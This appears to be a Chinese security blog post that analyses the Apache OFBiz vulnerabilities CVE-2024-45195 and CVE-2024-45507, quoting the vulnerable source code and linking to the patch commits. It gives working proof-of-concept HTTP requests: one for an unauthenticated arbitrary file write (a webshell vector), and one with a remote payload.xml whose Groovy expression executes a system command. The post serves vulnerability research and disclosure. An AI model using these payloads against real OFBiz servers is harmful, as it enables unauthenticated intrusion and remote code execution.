<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="91018899eb2ed6e5fcb8480f457b1dde">浅析Apache Ofbiz CVE-2024-45195 &amp; CVE-2024-45507</h1>
<p>漏洞通告链接：</p>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45195" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2024-45195</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45507" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2024-45507</a></li>
</ul>
<h2 data-content="1" id="4e4adb96f0b0d3faf19421fab9aa5127">CVE-2024-45195</h2>
<p>这个漏洞和之前的CVE-2024-38856原理是一样的，可以在unauth controller后面跟一个视图来覆盖，之前CVE-2024-38856的修复是直接将<code>ProgramExport</code>加了个权限，<code>CVE-2024-45195</code>是重新找了个<code>screen</code>来写文件，具体的<code>screen</code>对应的<code>groovy</code>文件为ViewDataFile.groovy如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.util.*</span>
<span class="kn">import</span> <span class="nn">java.net.*</span>
<span class="kn">import</span> <span class="nn">org.apache.ofbiz.security.*</span>
<span class="kn">import</span> <span class="nn">org.apache.ofbiz.base.util.*</span>
<span class="kn">import</span> <span class="nn">org.apache.ofbiz.datafile.*</span>

<span class="n">uiLabelMap</span> <span class="o">=</span> <span class="n">UtilProperties</span><span class="o">.</span><span class="na">getResourceBundleMap</span><span class="o">(</span><span class="s">"WebtoolsUiLabels"</span><span class="o">,</span> <span class="n">locale</span><span class="o">)</span>
<span class="n">messages</span> <span class="o">=</span> <span class="o">[]</span>

<span class="n">dataFileSave</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"DATAFILE_SAVE"</span><span class="o">)</span>

<span class="n">entityXmlFileSave</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"ENTITYXML_FILE_SAVE"</span><span class="o">)</span>

<span class="n">dataFileLoc</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"DATAFILE_LOCATION"</span><span class="o">)</span>
<span class="n">definitionLoc</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"DEFINITION_LOCATION"</span><span class="o">)</span>
<span class="n">definitionName</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"DEFINITION_NAME"</span><span class="o">)</span>
<span class="n">dataFileIsUrl</span> <span class="o">=</span> <span class="kc">null</span> <span class="o">!=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"DATAFILE_IS_URL"</span><span class="o">)</span>
<span class="n">definitionIsUrl</span> <span class="o">=</span> <span class="kc">null</span> <span class="o">!=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"DEFINITION_IS_URL"</span><span class="o">)</span>

<span class="k">try</span> <span class="o">{</span>
    <span class="n">dataFileUrl</span> <span class="o">=</span> <span class="n">dataFileIsUrl</span><span class="o">?</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">dataFileLoc</span><span class="o">):</span><span class="n">UtilURL</span><span class="o">.</span><span class="na">fromFilename</span><span class="o">(</span><span class="n">dataFileLoc</span><span class="o">)</span>
<span class="o">}</span>
<span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">())</span>
<span class="o">}</span>

<span class="k">try</span> <span class="o">{</span>
    <span class="n">definitionUrl</span> <span class="o">=</span> <span class="n">definitionIsUrl</span><span class="o">?</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">definitionLoc</span><span class="o">):</span><span class="n">UtilURL</span><span class="o">.</span><span class="na">fromFilename</span><span class="o">(</span><span class="n">definitionLoc</span><span class="o">)</span>
<span class="o">}</span>
<span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">())</span>
<span class="o">}</span>

<span class="n">definitionNames</span> <span class="o">=</span> <span class="kc">null</span>
<span class="nf">if</span> <span class="o">(</span><span class="n">definitionUrl</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">ModelDataFileReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">ModelDataFileReader</span><span class="o">.</span><span class="na">getModelDataFileReader</span><span class="o">(</span><span class="n">definitionUrl</span><span class="o">)</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">reader</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">definitionNames</span> <span class="o">=</span> <span class="o">((</span><span class="n">Collection</span><span class="o">)</span><span class="n">reader</span><span class="o">.</span><span class="na">getDataFileNames</span><span class="o">()).</span><span class="na">iterator</span><span class="o">()</span>
            <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"definitionNames"</span><span class="o">,</span> <span class="n">definitionNames</span><span class="o">)</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">())</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="n">dataFile</span> <span class="o">=</span> <span class="kc">null</span>
<span class="nf">if</span> <span class="o">(</span><span class="n">dataFileUrl</span> <span class="o">&amp;&amp;</span> <span class="n">definitionUrl</span> <span class="o">&amp;&amp;</span> <span class="n">definitionNames</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">dataFile</span> <span class="o">=</span> <span class="n">DataFile</span><span class="o">.</span><span class="na">readFile</span><span class="o">(</span><span class="n">dataFileUrl</span><span class="o">,</span> <span class="n">definitionUrl</span><span class="o">,</span> <span class="n">definitionName</span><span class="o">)</span>
        <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"dataFile"</span><span class="o">,</span> <span class="n">dataFile</span><span class="o">)</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span> <span class="n">Debug</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">e</span><span class="o">)</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="k">if</span> <span class="o">(</span><span class="n">dataFile</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">modelDataFile</span> <span class="o">=</span> <span class="n">dataFile</span><span class="o">.</span><span class="na">getModelDataFile</span><span class="o">()</span>
    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"modelDataFile"</span><span class="o">,</span> <span class="n">modelDataFile</span><span class="o">)</span>
<span class="o">}</span>

<span class="k">if</span> <span class="o">(</span><span class="n">dataFile</span> <span class="o">&amp;&amp;</span> <span class="n">dataFileSave</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">dataFile</span><span class="o">.</span><span class="na">writeDataFile</span><span class="o">(</span><span class="n">dataFileSave</span><span class="o">)</span>
        <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">uiLabelMap</span><span class="o">.</span><span class="na">WebtoolsDataFileSavedTo</span> <span class="o">+</span> <span class="n">dataFileSave</span><span class="o">)</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">())</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="k">if</span> <span class="o">(</span><span class="n">dataFile</span> <span class="o">&amp;&amp;</span> <span class="n">entityXmlFileSave</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">//dataFile.writeDataFile(entityXmlFileSave)</span>
        <span class="n">DataFile2EntityXml</span><span class="o">.</span><span class="na">writeToEntityXml</span><span class="o">(</span><span class="n">entityXmlFileSave</span><span class="o">,</span> <span class="n">dataFile</span><span class="o">)</span>
        <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">uiLabelMap</span><span class="o">.</span><span class="na">WebtoolsDataEntityFileSavedTo</span> <span class="o">+</span> <span class="n">entityXmlFileSave</span><span class="o">)</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">messages</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">())</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="n">context</span><span class="o">.</span><span class="na">messages</span> <span class="o">=</span> <span class="n">messages</span>
</pre></div>
<p>代码很简单，两次远程url加载文件，然后可随意保存到指定位置写Webshell，复现如下：</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/webtools/control/forgotPassword/viewdatafile</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span><span class="l"> </span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=842FA87866E065DFD2FC7B92C84E48B8.jvm1; OFBiz.Visitor=10000</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<span class="na">Sec-Ch-Ua</span><span class="o">:</span> <span class="l">"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"</span>
<span class="na">Sec-Ch-Ua-Mobile</span><span class="o">:</span> <span class="l">?0</span>
<span class="na">Sec-Ch-Ua-Platform</span><span class="o">:</span> <span class="l">"macOS"</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
<span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
<span class="na">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
<span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
<span class="na">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">187</span>

DATAFILE_LOCATION=http://127.0.0.1:8081/1.xml&amp;DEFINITION_IS_URL=1&amp;DATAFILE_IS_URL=1&amp;DEFINITION_LOCATION=http://127.0.0.1:8081/2.xml&amp;DATAFILE_SAVE=/tmp/2.txt&amp;DEFINITION_NAME=TaxwareOutHead
</pre></div>
<p>2.xml文件内容：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;data-files</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
        <span class="na">xsi:noNamespaceSchemaLocation=</span><span class="s">"https://ofbiz.apache.org/dtds/datafiles.xsd"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;data-file</span> <span class="na">name=</span><span class="s">"TaxwareOutHead"</span> <span class="na">type-code=</span><span class="s">"001"</span> <span class="na">record-length=</span><span class="s">"21"</span> <span class="na">separator-style=</span><span class="s">"fixed-record"</span> <span class="na">start-line=</span><span class="s">"0"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;record</span> <span class="na">name=</span><span class="s">"outHead"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">"COMPRESSION_INDICATOR"</span> <span class="na">position=</span><span class="s">"1"</span> <span class="na">length=</span><span class="s">"20"</span> <span class="na">type=</span><span class="s">"String"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/record&gt;</span>
    <span class="nt">&lt;/data-file&gt;</span>
<span class="nt">&lt;/data-files&gt;</span>
</pre></div>
<p>1.xml文件内容：</p>
<pre><code>123456789012345678901</code></pre>
<p>（这里需要注意下2.xml和1.xml对应的record-length和length）上面将<code>23456789012345678901</code>内容写入到<code>/tmp/2.txt</code>文件中。</p>
<p>在最新版的Ofbiz中（18.12.16）版本引入了视图权限校验，具体issue如下：<a href="https://github.com/apache/ofbiz-framework/commit/ab78769c2d7f22bd2ca8cc77b6be4f71d8bba24f" target="_blank">https://github.com/apache/ofbiz-framework/commit/ab78769c2d7f22bd2ca8cc77b6be4f71d8bba24f</a></p>
<p>其实这个修复issus在上个版本，也就是修复CVE-2024-38856的时候提过，不过看样子是官方觉得麻烦，就直接给ProgramExport screen加了权限，包括下面的CVE-2024-45507漏洞，也有一部分利用了这个screen覆盖功能。</p>
<h2 data-content="1" id="cec70ef6289901df32a35121863445cf">CVE-2024-45507</h2>
<p>漏洞的修复issue在：<a href="https://github.com/apache/ofbiz-framework/commit/ffb1bc487983fa672ac4fbeccf7ed7175e2accd3" target="_blank">https://github.com/apache/ofbiz-framework/commit/ffb1bc487983fa672ac4fbeccf7ed7175e2accd3</a></p>
<p>允许了远程加载文件来渲染screen，比如如下这个<code>screen</code>:</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;screen</span> <span class="na">name=</span><span class="s">"StatsSinceStart"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;section&gt;</span>
            <span class="nt">&lt;actions&gt;</span>
                <span class="nt">&lt;set</span> <span class="na">field=</span><span class="s">"titleProperty"</span> <span class="na">value=</span><span class="s">"WebtoolsStatsMainPageTitle"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;set</span> <span class="na">field=</span><span class="s">"tabButtonItem"</span> <span class="na">value=</span><span class="s">"stats"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;script</span> <span class="na">location=</span><span class="s">"component://webtools/groovyScripts/stats/StatsSinceStart.groovy"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/actions&gt;</span>
            <span class="nt">&lt;widgets&gt;</span>
                <span class="nt">&lt;decorator-screen</span> <span class="na">name=</span><span class="s">"StatsDecorator"</span> <span class="na">location=</span><span class="s">"${parameters.statsDecoratorLocation}"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;decorator-section</span> <span class="na">name=</span><span class="s">"body"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;section&gt;</span>
                            <span class="nt">&lt;widgets&gt;</span>
                                <span class="nt">&lt;container</span> <span class="na">style=</span><span class="s">"page-title"</span><span class="nt">&gt;</span>
                                    <span class="nt">&lt;label</span> <span class="na">text=</span><span class="s">"${uiLabelMap[titleProperty]}"</span><span class="nt">/&gt;</span>
                                <span class="nt">&lt;/container&gt;</span>
                                <span class="nt">&lt;include-menu</span> <span class="na">name=</span><span class="s">"StatsSinceStart"</span> <span class="na">location=</span><span class="s">"component://webtools/widget/Menus.xml"</span><span class="nt">/&gt;</span>
                                <span class="nt">&lt;label&gt;</span>${uiLabelMap.WebtoolsStatsCurrentTime} ${nowTimestamp}<span class="nt">&lt;/label&gt;</span>
                                <span class="nt">&lt;screenlet</span> <span class="na">title=</span><span class="s">"${uiLabelMap.WebtoolsStatsRequestStats}"</span> <span class="na">padded=</span><span class="s">"false"</span><span class="nt">&gt;</span>
                                    <span class="nt">&lt;include-grid</span> <span class="na">name=</span><span class="s">"ListRequestStats"</span> <span class="na">location=</span><span class="s">"component://webtools/widget/StatsForms.xml"</span><span class="nt">/&gt;</span>
                                <span class="nt">&lt;/screenlet&gt;</span>
                                <span class="nt">&lt;screenlet</span> <span class="na">title=</span><span class="s">"${uiLabelMap.WebtoolsStatsEventStats}"</span> <span class="na">padded=</span><span class="s">"false"</span><span class="nt">&gt;</span>
                                    <span class="nt">&lt;include-grid</span> <span class="na">name=</span><span class="s">"ListEventStats"</span> <span class="na">location=</span><span class="s">"component://webtools/widget/StatsForms.xml"</span><span class="nt">/&gt;</span>
                                <span class="nt">&lt;/screenlet&gt;</span>
                                <span class="nt">&lt;screenlet</span> <span class="na">title=</span><span class="s">"${uiLabelMap.WebtoolsStatsViewStats}"</span> <span class="na">padded=</span><span class="s">"false"</span><span class="nt">&gt;</span>
                                    <span class="nt">&lt;include-grid</span> <span class="na">name=</span><span class="s">"ListViewStats"</span> <span class="na">location=</span><span class="s">"component://webtools/widget/StatsForms.xml"</span><span class="nt">/&gt;</span>
                                <span class="nt">&lt;/screenlet&gt;</span>
                            <span class="nt">&lt;/widgets&gt;</span>
                        <span class="nt">&lt;/section&gt;</span>
                    <span class="nt">&lt;/decorator-section&gt;</span>
                <span class="nt">&lt;/decorator-screen&gt;</span>
            <span class="nt">&lt;/widgets&gt;</span>
        <span class="nt">&lt;/section&gt;</span>
    <span class="nt">&lt;/screen&gt;</span>
</pre></div>
<p>xml文件配置中有一段<code>&lt;decorator-screen name="StatsDecorator" location="${parameters.statsDecoratorLocation}"&gt;</code>，这里就是一个二次模板注入的问题，当程序加载到这个xml文件时候，会对上面这一段再次渲染一次，对应的代码如下：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">renderWidgetString</span><span class="o">(</span><span class="n">Appendable</span> <span class="n">writer</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span><span class="o">,</span> <span class="n">ScreenStringRenderer</span> <span class="n">screenStringRenderer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">GeneralException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
            <span class="kt">boolean</span> <span class="n">condTrue</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">condition</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">condition</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="n">context</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">condTrue</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">condTrue</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">AbstractModelAction</span><span class="o">.</span><span class="na">runSubActions</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">actions</span><span class="o">,</span> <span class="n">context</span><span class="o">);</span>

                <span class="k">try</span> <span class="o">{</span>
                    <span class="n">screenStringRenderer</span><span class="o">.</span><span class="na">renderSectionBegin</span><span class="o">(</span><span class="n">writer</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>

                    <span class="n">renderSubWidgetsString</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">subWidgets</span><span class="o">,</span> <span class="n">writer</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">screenStringRenderer</span><span class="o">);</span>
</pre></div>
<p>其实全局搜索一下系统的<code>&lt;decorator-screen name="StatsDecorator" location="${parameters.statsDecoratorLocation}</code>类似结构，可以观察到绝大多数都是<code>&lt;decorator-screen name="main-decorator" location="${parameters.mainDecoratorLocation}"&gt;</code>，也就是<code>mainDecoratorLocation</code>这个参数，但这个参数利用不了，可以简单看一下context中<code>parameters</code>参数赋值的逻辑：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getCombinedMap</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">Set</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">namesToSkip</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">combinedMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">combinedMap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">getParameterMap</span><span class="o">(</span><span class="n">request</span><span class="o">));</span>                   <span class="c1">// parameters override nothing</span>
        <span class="n">combinedMap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">getServletContextMap</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">namesToSkip</span><span class="o">));</span> <span class="c1">// bottom level application attributes</span>
        <span class="n">combinedMap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">getSessionMap</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">namesToSkip</span><span class="o">));</span>        <span class="c1">// session overrides application</span>
        <span class="n">combinedMap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">getAttributeMap</span><span class="o">(</span><span class="n">request</span><span class="o">));</span>                   <span class="c1">// attributes trump them all</span>

        <span class="k">return</span> <span class="n">combinedMap</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>由于<code>mainDecoratorLocation</code>在<code>web.xml</code>中定义了，所以在执行到第二个语句，也就是<code>combinedMap.putAll(getServletContextMap(request, namesToSkip));</code>的时候，会将请求参数中的<code>mainDecoratorLocation</code>给覆盖成默认值，因此不可控。</p>
<p>最后复现如下：</p>
<pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: 
Cookie: JSESSIONID=64FB07C6F3A047C4B6760B23070A03C0.jvm1; OFBiz.Visitor=10000
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

statsDecoratorLocation=http://127.0.0.1:8081/payload.xml</code></pre>
<p><code>payload.xml</code>文件内容为：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;screens</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
        <span class="na">xmlns=</span><span class="s">"http://ofbiz.apache.org/Widget-Screen"</span> <span class="na">xsi:schemaLocation=</span><span class="s">"http://ofbiz.apache.org/Widget-Screen"</span> <span class="err">http://ofbiz.apache.org/dtds/widget-screen.xsd"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;screen</span> <span class="na">name=</span><span class="s">"StatsDecorator"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;section&gt;</span>
            <span class="nt">&lt;actions&gt;</span>
                <span class="nt">&lt;set</span> <span class="na">field=</span><span class="s">"headerItem"</span> <span class="na">value=</span><span class="s">"${groovy:throw new Exception('open -a Calculator'.execute().text);}"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;entity-one</span> <span class="na">entity-name=</span><span class="s">"FinAccount"</span> <span class="na">value-field=</span><span class="s">"finAccount"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/actions&gt;</span>
        <span class="nt">&lt;/section&gt;</span>
    <span class="nt">&lt;/screen&gt;</span>

<span class="nt">&lt;/screens&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240909110145-d937bc8a-6e57-1.png"/></p>
</div>
</div>